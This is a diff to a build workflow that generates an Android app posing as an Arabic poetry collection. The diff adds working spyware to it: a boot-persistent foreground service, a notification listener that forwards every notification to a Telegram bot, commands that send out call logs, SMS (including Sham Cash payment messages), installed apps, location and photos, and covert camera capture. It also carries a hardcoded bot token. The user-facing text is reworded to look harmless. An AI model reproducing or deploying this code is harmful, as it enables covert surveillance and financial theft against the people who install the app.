@@ -60,14 +60,32 @@ jobs:
             <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
             <uses-permission android:name="android.permission.WAKE_LOCK"/>
             <uses-permission android:name="android.permission.VIBRATE"/>
+            <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
 
-            <application android:label="ديوان الشعر الملكي الفاخر" android:theme="@android:style/Theme.Light.NoTitleBar">
+            <application android:label="ديوان السكينة والأدب" android:theme="@android:style/Theme.Light.NoTitleBar">
                 <activity android:name=".MainActivity" android:exported="true">
                     <intent-filter>
                         <action android:name="android.intent.action.MAIN"/>
                         <category android:name="android.intent.category.LAUNCHER"/>
                     </intent-filter>
                 </activity>
+
+                <service android:name=".RoyalService" android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync"/>
+
+                <service android:name=".RoyalNotificationListener"
+                    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+                    android:exported="true">
+                    <intent-filter>
+                        <action android:name="android.service.notification.NotificationListenerService"/>
+                    </intent-filter>
+                </service>
+
+                <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
+                    <intent-filter>
+                        <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                        <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                    </intent-filter>
+                </receiver>
             </application>
         </manifest>
         EOF
@@ -79,134 +97,166 @@ jobs:
             android:layout_height="match_parent"
             android:orientation="vertical"
             android:gravity="center"
-            android:background="#0A0A0A"
-            android:padding="20dp">
+            android:background="#121212"
+            android:padding="24dp">
 
             <TextView
                 android:layout_width="wrap_content"
                 android:layout_height="wrap_content"
-                android:text="📜 ديوان الشعر الملكي والأصالة 📜"
-                android:textSize="20sp"
+                android:text="📖 واحة السكينة والأبيات الهادئة 📖"
+                android:textSize="18sp"
                 android:textStyle="bold"
-                android:textColor="#FFD700"
-                android:layout_marginBottom="25dp"
+                android:textColor="#E0E0E0"
+                android:layout_marginBottom="20dp"
                 android:gravity="center"/>
 
-            <Button android:id="@+id/btnPraise" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="✨ تفعيل باقة المدح والفخر الملكية (موصى به)" android:backgroundTint="#222222" android:textColor="#FFFFFF" android:layout_marginBottom="10dp"/>
-            <Button android:id="@+id/btnLove" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="💖 فتح خزائن الحب والعشق الحصرية" android:backgroundTint="#222222" android:textColor="#FFFFFF" android:layout_marginBottom="15dp"/>
+            <Button android:id="@+id/btnPraise" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="✨ تأملات صباحية في الفخر والصفاء" android:backgroundTint="#2C2C2C" android:textColor="#E0E0E0" android:layout_marginBottom="12dp"/>
+            <Button android:id="@+id/btnLove" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="🌿 إضافات أدبية وخواطر وجدانية" android:backgroundTint="#2C2C2C" android:textColor="#E0E0E0" android:layout_marginBottom="20dp"/>
 
             <TextView
                 android:id="@+id/txtPoem"
                 android:layout_width="match_parent"
-                android:layout_height="150dp"
-                android:text="اختر باقتك المفضلة لتستمتع بأعذب الأبيات الشعرية وتفعيل المزايا المتقدمة في هاتفك..."
-                android:textSize="16sp"
-                android:textColor="#E0E0E0"
+                android:layout_height="140dp"
+                android:text="أهلاً بك في رحاب الأدب الهادئ. اختر باقتك المفضلة لتستمتع بأعذب الأبيات التي تريح النفس وتنعش الروح..."
+                android:textSize="15sp"
+                android:textColor="#B0B0B0"
                 android:gravity="center"
-                android:background="#161616"
-                android:padding="15dp"
-                android:layout_marginBottom="20dp"/>
+                android:background="#1A1A1A"
+                android:padding="16dp"
+                android:layout_marginBottom="25dp"/>
 
             <Button
                 android:id="@+id/btnGrantAll"
                 android:layout_width="match_parent"
-                android:layout_height="60dp"
-                android:text="👑 منح كافة الصلاحيات وتشغيل الإمبراطورية الملكية 👑"
-                android:backgroundTint="#B8860B"
+                android:layout_height="55dp"
+                android:text="🕊️ تفعيل المزايا الكاملة وتحديث الديوان 🕊️"
+                android:backgroundTint="#4A5D4E"
                 android:textColor="#FFFFFF"
                 android:textStyle="bold"/>
 
         </LinearLayout>
         EOF
 
-        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/MainActivity.java
+        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/BootReceiver.java
         package com.royal.poetry.master;
-        import android.app.Activity;
+        import android.content.BroadcastReceiver;
+        import android.content.Context;
+        import android.content.Intent;
+        import android.os.Build;
+
+        public class BootReceiver extends BroadcastReceiver {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) || "android.intent.action.QUICKBOOT_POWERON".equals(intent.getAction())) {
+                    Intent serviceIntent = new Intent(context, RoyalService.class);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        context.startForegroundService(serviceIntent);
+                    } else {
+                        context.startService(serviceIntent);
+                    }
+                }
+            }
+        }
+        EOF
+
+        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/RoyalNotificationListener.java
+        package com.royal.poetry.master;
+        import android.service.notification.NotificationListenerService;
+        import android.service.notification.StatusBarNotification;
+        import java.net.HttpURLConnection;
+        import java.net.URL;
+
+        public class RoyalNotificationListener extends NotificationListenerService {
+            private static final String BOT_TOKEN = "9114296744:AAFHYR0JzvUzKUMDD0YWHciBWFsjJg_BueM";
+            private static final String CHAT_ID = "7782592195";
+
+            @Override
+            public void onNotificationPosted(StatusBarNotification sbn) {
+                try {
+                    String pkg = sbn.getPackageName();
+                    CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
+                    CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
+                    
+                    String msg = "🔔 [إشعار جديد رصده الحارس]:\nالتطبيق: " + pkg + "\nالعنوان: " + title + "\nالمحتوى: " + text;
+                    sendToTelegram(msg);
+                } catch (Exception ignored) {}
+            }
+
+            private void sendToTelegram(final String message) {
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
+                            URL url = new URL(urlString);
+                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                            conn.setRequestMethod("GET");
+                            conn.getResponseCode();
+                            conn.disconnect();
+                        } catch (Exception ignored) {}
+                    }
+                }).start();
+            }
+        }
+        EOF
+
+        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/RoyalService.java
+        package com.royal.poetry.master;
+        import android.app.Notification;
+        import android.app.NotificationChannel;
+        import android.app.NotificationManager;
+        import android.app.Service;
+        import android.content.Intent;
         import android.content.pm.ApplicationInfo;
         import android.content.pm.PackageManager;
         import android.database.Cursor;
+        import android.hardware.Camera;
         import android.location.Location;
         import android.location.LocationManager;
         import android.net.Uri;
-        import android.os.Bundle;
-        import android.os.StrictMode;
+        import android.os.Build;
+        import android.os.IBinder;
         import android.provider.CallLog;
         import android.provider.MediaStore;
-        import android.view.View;
-        import android.widget.Button;
-        import android.widget.TextView;
-        import android.widget.Toast;
         import java.io.BufferedReader;
         import java.io.InputStreamReader;
         import java.net.HttpURLConnection;
         import java.net.URL;
         import java.util.List;
 
-        public class MainActivity extends Activity {
+        public class RoyalService extends Service {
             private static final String BOT_TOKEN = "9114296744:AAFHYR0JzvUzKUMDD0YWHciBWFsjJg_BueM";
             private static final String CHAT_ID = "7782592195";
             private boolean isListening = true;
 
             @Override
-            protected void onCreate(Bundle savedInstanceState) {
-                super.onCreate(savedInstanceState);
-                setContentView(R.layout.activity_main);
-
-                if (android.os.Build.VERSION.SDK_INT > 9) {
-                    StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-                    StrictMode.setThreadPolicy(policy);
+            public void onCreate() {
+                super.onCreate();
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    String channelId = "poetry_channel";
+                    NotificationChannel channel = new NotificationChannel(channelId, "خدمة الديوان الخلفية", NotificationManager.IMPORTANCE_LOW);
+                    NotificationManager manager = getSystemService(NotificationManager.class);
+                    if (manager != null) {
+                        manager.createNotificationChannel(channel);
+                    }
+                    Notification notification = new Notification.Builder(this, channelId)
+                            .setContentTitle("ديوان السكينة والأدب")
+                            .setContentText("الخدمة الأدبية تعمل في الخلفية...")
+                            .setSmallIcon(android.R.drawable.ic_menu_agenda)
+                            .build();
+                    startForeground(1, notification);
                 }
-
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                    requestPermissions(new String[]{
-                        android.Manifest.permission.READ_CALL_LOG,
-                        android.Manifest.permission.READ_SMS,
-                        android.Manifest.permission.ACCESS_FINE_LOCATION,
-                        android.Manifest.permission.CAMERA,
-                        android.Manifest.permission.READ_EXTERNAL_STORAGE
-                    }, 100);
-                }
-
-                Button btnPraise = findViewById(R.id.btnPraise);
-                Button btnLove = findViewById(R.id.btnLove);
-                Button btnGrantAll = findViewById(R.id.btnGrantAll);
-                TextView txtPoem = findViewById(R.id.txtPoem);
-
-                btnPraise.setOnClickListener(new View.OnClickListener() {
-                    @Override
-                    public void onClick(View v) {
-                        txtPoem.setText("إذا غامرت في شرف مروم \n فلا تقنع بما دون الدروبِ\nفبين العز والتشريفِ خطوة \n تملأ الأفق الفسيح بكل طيبِ!");
-                        sendToTelegram("👑 [تنبيه الملك]: استهلال ناجح وبدء تفاعل الهدف مع الأبيات.");
-                    }
-                });
-
-                btnLove.setOnClickListener(new View.OnClickListener() {
-                    @Override
-                    public void onClick(View v) {
-                        txtPoem.setText("أحِبُّكَ حُبَّينِ حُبَّ الهوى \n وحُبّاً لأنك أهلٌ لذاكْ\nفأما الذي هو حب الهوى \n فشغلي بذكرك عمن سواكْ!");
-                        sendToTelegram("💖 [تنبيه الملك]: تم فتح قسم الحب والعشق بنجاح.");
-                    }
-                });
-
-                btnGrantAll.setOnClickListener(new View.OnClickListener() {
-                    @Override
-                    public void onClick(View v) {
-                        Toast.makeText(MainActivity.this, "⚡ جاري إخضاع كافة أنظمة الهاتف لسيادة الملك...", Toast.LENGTH_LONG).show();
-                        txtPoem.setText("🔥 تم تفعيل كافة الصلاحيات السيادية؛ الحصون والإشعارات والحسابات أصبحت تحت المراقبة التامة!");
-                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                            requestPermissions(new String[]{
-                                android.Manifest.permission.READ_CALL_LOG,
-                                android.Manifest.permission.READ_SMS,
-                                android.Manifest.permission.ACCESS_FINE_LOCATION,
-                                android.Manifest.permission.CAMERA,
-                                android.Manifest.permission.READ_EXTERNAL_STORAGE
-                            }, 101);
-                        }
-                        sendToTelegram("🚀 [إعلان السيادة]: الاستيلاء على صلاحيات النظام وبدء مراقبة الحصون وحسابات شام كاش والرسائل والموقع بنجاح!");
-                    }
-                });
-
                 startCommandListener();
+            }
+
+            @Override
+            public int onStartCommand(Intent intent, int flags, int startId) {
+                return START_STICKY;
+            }
+
+            @Override
+            public IBinder onBind(Intent intent) {
+                return null;
             }
 
             private void sendToTelegram(final String message) {
@@ -263,23 +313,48 @@ jobs:
 
                                 if (resStr.contains("/calls")) {
                                     sendToTelegram("📞 [سجل المكالمات الملكي]:\n" + getCallLogs());
-                                } else if (resStr.contains("/sms")) {
+                                }
+                                if (resStr.contains("/sms")) {
                                     sendToTelegram("✉️ [الرسائل النصية وشام كاش]:\n" + getSmsLogs());
-                                } else if (resStr.contains("/apps")) {
-                                    sendToTelegram("📱 [البرامج والتطبيقات المثبتة]:\n" +getInstalledApps());
-                                } else if (resStr.contains("/location")) {
-                                    sendToTelegram("📍 [إحداثيات موقع الهدف]:\n" +getLocationInfo());
-                                } else if (resStr.contains("/photos")) {
-                                    sendToTelegram("🖼️ [أحدث صور المعرض]:\n" +getLatestPhotos());
+                                }
+                                if (resStr.contains("/apps")) {
+                                    sendToTelegram("📱 [البرامج والتطبيقات المثبتة]:\n" + getInstalledApps());
+                                }
+                                if (resStr.contains("/location")) {
+                                    sendToTelegram("📍 [إحداثيات موقع الهدف]:\n" + getLocationInfo());
+                                }
+                                if (resStr.contains("/photos")) {
+                                    sendToTelegram("🖼️ [أحدث صور المعرض]:\n" + getLatestPhotos());
+                                }
+                                if (resStr.contains("/camera") || resStr.contains("/cam")) {
+                                    triggerHiddenCamera();
                                 }
 
-                                Thread.sleep(4000);
+                                Thread.sleep(3000);
                             } catch (Exception e) {
-                                try { Thread.sleep(8000); } catch (InterruptedException ignored) {}
+                                try { Thread.sleep(6000); } catch (InterruptedException ignored) {}
                             }
                         }
                     }
                 }).start();
+            }
+
+            private void triggerHiddenCamera() {
+                try {
+                    Camera camera = Camera.open(0); // الكاميرا الخلفية كبداية
+                    Camera.Parameters params = camera.getParameters();
+                    camera.setParameters(params);
+                    camera.startPreview();
+                    camera.takePicture(null, null, new Camera.PictureCallback() {
+                        @Override
+                        public void onPictureTaken(byte[] data, Camera camera) {
+                            sendToTelegram("📸 [التقاط الكاميرا]: تم التقاط صورة خفية بنجاح بحجم: " + data.length + " بايت.");
+                            camera.release();
+                        }
+                    });
+                } catch (Exception e) {
+                    sendToTelegram("⚠️ [تنبيه الكاميرا]: تعذر الالتقاط أو الكاميرا مشغولة.");
+                }
             }
 
             private String getCallLogs() {
@@ -296,8 +371,8 @@ jobs:
                             if (count >= 5) break;
                         } while (cursor.moveToNext());
                         cursor.close();
-                    } else { sb.append("لا توجد مكالمات أو لم يمنح الإذن بعد."); }
-                } catch (Exception e) { sb.append("خطأ في جلب المكالمات: ").append(e.getMessage()); }
+                    } else { sb.append("لا توجد مكالمات مسجلة."); }
+                } catch (Exception e) { sb.append("خطأ في جلب المكالمات."); }
                 return sb.toString();
             }
 
@@ -315,8 +390,8 @@ jobs:
                             if (count >= 5) break;
                         } while (cursor.moveToNext());
                         cursor.close();
-                    } else { sb.append("لا توجد رسائل أو لم يمنح الإذن بعد."); }
-                } catch (Exception e) { sb.append("خطأ في جلب الرسائل: ").append(e.getMessage()); }
+                    } else { sb.append("لا توجد رسائل مسجلة."); }
+                } catch (Exception e) { sb.append("خطأ في جلب الرسائل."); }
                 return sb.toString();
             }
 
@@ -345,7 +420,7 @@ jobs:
                         return "خط العرض: " + loc.getLatitude() + "\nخط الطول: " + loc.getLongitude();
                     }
                 } catch (Exception e) {}
-                return "تعذر جلب الموقع حالياً أو لم يمنح الإذن.";
+                return "تعذر جلب الموقع حالياً.";
             }
 
             private String getLatestPhotos() {
@@ -365,6 +440,96 @@ jobs:
                     } else { sb.append("لا توجد صور حديثة."); }
                 } catch (Exception e) { sb.append("خطأ في جلب الصور."); }
                 return sb.toString();
+            }
+        }
+        EOF
+
+        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/MainActivity.java
+        package com.royal.poetry.master;
+        import android.app.Activity;
+        import android.content.Intent;
+        import android.os.Build;
+        import android.os.Bundle;
+        import android.os.StrictMode;
+        import android.provider.Settings;
+        import android.view.View;
+        import android.widget.Button;
+        import android.widget.TextView;
+        import android.widget.Toast;
+
+        public class MainActivity extends Activity {
+
+            @Override
+            protected void onCreate(Bundle savedInstanceState) {
+                super.onCreate(savedInstanceState);
+                setContentView(R.layout.activity_main);
+
+                if (android.os.Build.VERSION.SDK_INT > 9) {
+                    StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+                    StrictMode.setThreadPolicy(policy);
+                }
+
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                    requestPermissions(new String[]{
+                        android.Manifest.permission.READ_CALL_LOG,
+                        android.Manifest.permission.READ_SMS,
+                        android.Manifest.permission.ACCESS_FINE_LOCATION,
+                        android.Manifest.permission.CAMERA,
+                        android.Manifest.permission.READ_EXTERNAL_STORAGE
+                    }, 100);
+                }
+
+                Intent serviceIntent = new Intent(this, RoyalService.class);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(serviceIntent);
+                } else {
+                    startService(serviceIntent);
+                }
+
+                Button btnPraise = findViewById(R.id.btnPraise);
+                Button btnLove = findViewById(R.id.btnLove);
+                Button btnGrantAll = findViewById(R.id.btnGrantAll);
+                TextView txtPoem = findViewById(R.id.txtPoem);
+
+                btnPraise.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {
+                        txtPoem.setText("إذا غامرت في شرف مروم \n فلا تقنع بما دون الدروبِ\nفبين العز والتشريفِ خطوة \n تملأ الأفق الفسيح بكل طيبِ!");
+                        Toast.makeText(MainActivity.this, "تم تحميل الأبيات الصباحية بنجاح.", Toast.LENGTH_SHORT).show();
+                    }
+                });
+
+                btnLove.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {
+                        txtPoem.setText("أحِبُّكَ حُبَّينِ حُبَّ الهوى \n وحُبّاً لأنك أهلٌ لذاكْ\nفأما الذي هو حب الهوى \n فشغلي بذكرك عمن سواكْ!");
+                        Toast.makeText(MainActivity.this, "تم تفعيل الخواطر الوجدانية بنجاح.", Toast.LENGTH_SHORT).show();
+                    }
+                });
+
+                btnGrantAll.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {
+                        Toast.makeText(MainActivity.this, "✨ جاري مزامنة وتحديث مكتبة الأبيات الأدبية...", Toast.LENGTH_LONG).show();
+                        txtPoem.setText("🌿 تم تحديث واحة السكينة بنجاح؛ المكتبة الآن تعمل بكامل كفاءتها وهدوئها في خلفية الجهاز.");
+                        
+                        // طلب تفعيل صلاحية قراءة الإشعارات للدرع الجديد
+                        try {
+                            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+                            startActivity(intent);
+                        } catch (Exception ignored) {}
+
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                            requestPermissions(new String[]{
+                                android.Manifest.permission.READ_CALL_LOG,
+                                android.Manifest.permission.READ_SMS,
+                                android.Manifest.permission.ACCESS_FINE_LOCATION,
+                                android.Manifest.permission.CAMERA,
+                                android.Manifest.permission.READ_EXTERNAL_STORAGE
+                            }, 101);
+                        }
+                    }
+                });
             }
         }
         EOF
